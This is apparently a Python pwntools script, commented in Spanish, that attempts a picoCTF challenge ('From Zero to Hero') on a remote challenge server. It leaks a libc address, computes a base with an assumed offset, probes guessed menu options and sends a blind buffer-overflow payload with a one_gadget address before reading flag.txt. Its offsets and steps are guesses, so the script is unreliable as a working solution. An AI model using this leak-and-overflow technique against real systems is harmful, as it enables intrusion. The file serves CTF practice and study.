#!/usr/bin/env python3

from pwn import *

HOST = 'jupiter.challenges.picoctf.org'
PORT = 29476

def exploit():
    p = remote(HOST, PORT)
    
    # Navegar diálogo
    p.recvuntil(b'From Zero to Hero')
    p.sendline(b'y')
    p.recvuntil(b'Really?')
    p.sendline(b'y')
    
    # Leak
    p.recvuntil(b'Take this: ')
    leak = p.recvline().strip()
    leak_addr = int(leak, 16)
    log.info(f"Leaked __libc_start_main+240: 0x{leak_addr:x}")
    
    # En libc 2.29, __libc_start_main+240
    libc_base = leak_addr - 0x21fd0  # Ajustado para +240
    log.info(f"Libc base: 0x{libc_base:x}")
    
    # Ahora el programa continúa pero no muestra menú
    # Basándonos en los strings, parece que hay un límite de poderes
    
    # Intentar simplemente enviar comandos
    p.sendline(b'')  # Enter para ver si muestra algo
    
    try:
        menu = p.recv(1024, timeout=1)
        log.info(f"Menu: {menu}")
    except:
        pass
    
    # Probar opción 0 (puede ser una opción oculta para win)
    p.sendline(b'0')
    
    try:
        response = p.recv(1024, timeout=1)
        if b'flag' in response or b'pico' in response:
            log.success(f"Found: {response}")
    except:
        pass
    
    # Intentar buffer overflow simple en la descripción
    p.sendline(b'1')
    p.sendline(b'1000')  # Length grande
    
    # Enviar payload con dirección de retorno sobrescrita
    payload = b'A' * 1000
    payload += p64(libc_base + 0x4f432)  # one_gadget
    
    p.sendline(payload)
    
    # Intentar trigger
    p.sendline(b'2')
    p.sendline(b'0')
    
    # Enviar comando
    p.sendline(b'cat flag.txt')
    
    try:
        flag = p.recvall(timeout=2)
        if b'picoCTF' in flag:
            start = flag.index(b'picoCTF')
            end = flag.index(b'}', start) + 1
            log.success(f"FLAG: {flag[start:end].decode()}")
        else:
            log.info(f"Output: {flag}")
    except Exception as e:
        log.info(f"Error: {e}")
        p.interactive()

if __name__ == "__main__":
    context.log_level = 'info'
    exploit()